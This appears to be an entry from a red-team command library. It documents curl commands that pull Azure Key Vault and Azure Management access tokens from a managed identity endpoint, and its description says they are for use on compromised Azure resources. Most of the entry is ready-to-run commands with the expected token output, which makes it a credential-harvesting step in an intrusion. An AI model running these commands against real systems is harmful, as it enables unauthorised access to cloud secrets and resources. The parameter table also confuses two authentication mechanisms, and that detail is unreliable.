---
id: 88473a7c-f85b-45c1-8fb4-94565bb7bd91
name: Get-Azure-Key-Vault-Access-Token
type: command
executor: bash
data: >-
  curl
  "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01"
  -H secret:$IDENTITY_HEADER

  curl
  "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01"
  -H secret:$IDENTITY_HEADER
output: null
created_at: '2023-05-24T18:03:17.782961+00:00'
updated_at: '2023-05-24T18:03:18.179034+00:00'
platforms:
  - Cloud
tags:
  - azure
  - token
  - managed-identity
verified: true
validated: true
---

# Get-Azure-Key-Vault-Access-Token

## Command

```bash
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

## Description

This command retrieves OAuth access tokens from the Azure Instance Metadata Service (IMDS) for the Key Vault and Azure Management APIs using a Managed Identity. Use this in compromised Azure resources to obtain tokens for subsequent API calls without explicit credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $IDENTITY_ENDPOINT | IMDS endpoint URL (e.g., http://169.254.169.254/metadata/identity/oauth2/token) | Yes |
| $IDENTITY_HEADER | Header value for IMDS requests (e.g., 'Metadata: true') | Yes |
| resource=https://vault.azure.net | Scope for Key Vault token | Built-in |
| resource=https://management.azure.com | Scope for Management API token | Built-in |
| api-version=2017-09-01 | API version for token request | Built-in |
| -H secret:$IDENTITY_HEADER | Passes the identity header to the request | Built-in |

## Examples

### Basic Usage

```bash
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

### Full Token Retrieval

Run both lines sequentially to get both tokens needed for Az PowerShell authentication.

## Expected Output

JSON response with token details:

```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1u...",
  "expires_in": "3599",
  "token_type": "Bearer",
  "client_id": "..."
}
```
Success: Valid JWT in access_token field. Failure: 400 Bad Request if env vars are unset or identity lacks permissions.

## Related

- [[procedures/Access-Azure-Key-Vault-Using-Managed-Identity]]
- [[commands/Connect-to-Azure-with-Access-Token]]
